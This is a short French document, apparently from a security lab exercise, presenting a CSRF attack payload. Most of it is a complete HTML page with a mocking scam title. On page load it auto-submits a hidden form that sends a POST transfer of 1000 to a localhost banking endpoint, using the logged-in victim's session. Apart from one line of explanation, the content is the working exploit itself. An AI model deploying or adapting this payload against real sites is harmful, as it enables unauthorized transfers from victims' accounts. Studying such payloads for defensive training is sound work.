# Commandes et Payloads Utilisés pour Exploiter la Faille CSRF

Ce formulaire envoie automatiquement une requête POST exploitant la session active d'un utilisateur connecté :

<!DOCTYPE html>
<html>
<head>
    <title>SCAMMED HAHA !!!!</title>
</head>
<body>
    <h1>PAYE LE IPHONE MEC</h1>
    <form action="http://localhost:8080/transfer" method="POST" id="transfer-form">
        <input type="hidden" name="amount" value="1000">
    </form>
    <script>document.getElementById('transfer-form').submit();</script>
</body>
</html>
